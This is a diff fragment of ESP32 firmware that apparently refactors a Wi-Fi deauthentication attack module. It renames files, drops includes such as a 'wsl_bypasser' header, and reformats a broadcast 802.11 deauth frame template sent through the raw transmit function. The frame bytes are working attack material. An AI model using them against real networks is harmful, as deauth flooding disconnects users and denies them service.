@@ -1,19 +1,9 @@
-#include "DeauthAttack.h"
-#include "common/SharedState.h"
-#include "ble/BleManager.h"
-#include "wsl_bypasser/wsl_bypasser.h"
-#include <string.h>
-#include "esp_wifi.h"
-#include "esp_log.h"
-#include "freertos/FreeRTOS.h"
-#include "freertos/task.h"
-#include "esp_coexist.h"
-#include "esp_wifi.h"
-#include "esp_bt.h"
-#include "esp_timer.h"
+#include "Deauth.h"
 
-static const char* TAG = "DeauthAttack";
 
+static const char* TAG = "Deauth";
+
+// Send Packet
 extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool enq);
 
 // Run the attack in freeRTOS task
@@ -39,13 +29,13 @@ static uint8_t attack_channel = -1;
 
 // Deauth frame template
 static const uint8_t deauth_frame[] = {
-    0xC0, 0x00,                         // Frame Control: Deauth (type=0, subtype=12)
-    0x00, 0x00,                         // Duration
+    0xC0, 0x00, // Frame Control: Deauth (type=0, subtype=12)
+    0x00, 0x00, // Duration
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00,                         // Sequence number
-    0x07, 0x00                          // Reason code
+    0x00, 0x00, // Sequence number
+    0x07, 0x00 // Reason code
 };
 
 // Wrapper for send_deauth_packets in a task function
